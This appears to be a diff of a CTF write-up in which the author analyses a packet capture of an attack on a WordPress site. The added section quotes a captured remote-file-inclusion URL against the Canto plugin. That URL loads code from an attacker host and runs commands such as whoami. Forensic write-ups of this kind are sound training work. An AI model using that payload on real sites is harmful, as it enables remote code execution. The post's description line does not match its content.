@@ -3,7 +3,6 @@ layout: post
 author: kranthikvrm
 title: CTF Writeup - 0xL4ugh CTF 2024
 description: In this blog post, I am sharing my experiences from my first year at RGUKT Nuzvid, where I experienced new faces, challenges, and exciting opportunities on my journey towards becoming an engineer.
-author: Kranthi Kumar
 date: 2024-02-13 07:43:00 +0800
 categories: [CTF Writeups]
 tags: [CTF, CTF Writeups]
@@ -27,7 +26,7 @@ Flag Format: 0xL4ugh{A1_A2}
 
 Example: 0xL4ugh{IP1_IP2_apache1.2.3_php1.2.3}(no spaces)
 ```
-<b>Solution approach:</b>
+<b>My approach:</b>
 
 They gave us a wordpress.pcap file, so I started my analysis using Wireshark.
 
@@ -45,7 +44,6 @@ ___________________________________________________________________________
 
 ## Challenge 2: WordPress - 2 [Medium]
 ```
-Same file from WordPress - 1
 
 Q1. During enumeration, the attacker tried to identify users on the site. List all the users that the attacker enumerated. Separate them with a colon. Sort them alphabetically.
 
@@ -56,7 +54,7 @@ Flag Format: 0xL4ugh{A1_A2}
 Example: 0xL4ugh{username1:username2_username:password_pageName.ext}
 ```
 
-<b>Solution approach:</b>
+<b>My approach:</b>
 
 As we already know the attacker IP, I filtered the traffic with the "POST" method as it is used to log in and the source IP as the attacker IP.
 
@@ -82,11 +80,58 @@ So for sure, the second parameter is the password that the attacker used. I saw 
 
 `(ip.dst == 192.168.204.132) && !(xml.cdata == "403") && (_ws.col.protocol == "HTTP/XML")`
 
-I analyzed all the filtered packets, and the packet 147357 response retrieved the information. I found it by following the HTTP stream.
+The above filter or query, (ip.dst == 192.168.204.132): This part filters packets where the destination IP address is 192.168.204.132 and !(xml.cdata == "403") this part selects packets where the XML data field (xml.cdata) is not equal to "403". So, it excludes packets containing XML data equal to "403" and (_ws.col.protocol == "HTTP/XML"), this part filters packets where the protocol in the Wireshark column is "HTTP/XML".
+
+I analyzed all the filtered packets, and the packet 147357 response says that the login successful. I found it by following the HTTP stream.
 ![brute force attempts -2](3.2.png)
 
 So the username:password is `demomorgan:demomorgan`
 
 And I know that the brute forced web page is `xmlrpc.php`
 ![brute force attempts -3](3.3.png)
-I got the flag; it is `0xL4ugh{a1l4m:demomorgan:not7amoksha_demomorgan:demomorgan_xmlrpc.php}`
+With the all the information, I got the final flag, it is `0xL4ugh{a1l4m:demomorgan:not7amoksha_demomorgan:demomorgan_xmlrpc.php}`
+
+## Challenge 3: WordPress - 3 [Hard]
+```
+Q1. Mention the names of the tools that the attacker used in the attack. (in alphabetical order)
+
+Q2. There was a vulnerable plugin that the attacker exploited. What is the C2 server of the attacker, and what is the name of the plugin?
+
+Q3. What is the version of the vulnerable plugin, and what is the CVE number associated with that plugin?
+
+Flag Format: 0xL4ugh{A1_A2_A3}
+
+Example: 0xL4ugh{tool1_tool2_C2_PluginName_1.2.3_CVE--} ```
+
+<b>My approach:</b>
+
+To solve Q1, I have to find the tools that the attacker used for the attack. Most of the times, checking the user-agent will give us this data. So let's check the HTTP traffic again.
+
+With `(ip.src == 192.168.204.132) && http.request` filter
+
+![user agent checking](4.1.png)
+
+User-Agent: `WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)`
+
+Attacker tried SQL Injection attack using sqlmap. 
+User-Agent: `sqlmap/1.7.12#stable (https://sqlmap.org)`
+![user agent checking](4.png)
+Sorting them in alphabetical order: `sqlmap_WPScan`
+
+Moving forward to Q2, I have to find the vulnerable plugin that the attacker exploited.
+
+so I used this filter `http contains "plugins"` and found the below leads.
+
+![vulnerable plugin](4.2.png)
+
+URL: `http://192.168.204.128/wordpress/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://172.26.211.155:8000&cmd=whoami` and `cmd=ls`
+
+I found that a plugin named "Canto" along with a command `whoami` and `ls` at the end of the URL. So this is the vulnerable plugin.
+
+With the information in hand, I can say the answer for Q2 is `172.26.211.155_canto`.
+
+Moving to Q3, and after some analysis, nothing was there related to plugin version and CVE. So I did a Google search, and the first hit shows that Canto 3.0.4 is vulnerable to CVE-2023-3452.
+![vulnerable plugin details](4.3.png)
+With the information gathered, the answer to Q3 is `3.0.4_CVE-2023-3452`. So the final flag is `0xL4ugh{SQLMap_WPScan_172.26.211.155_canto_3.0.4_CVE-2023-3452}`. 
+
+Thank you for reading buddy ❤️
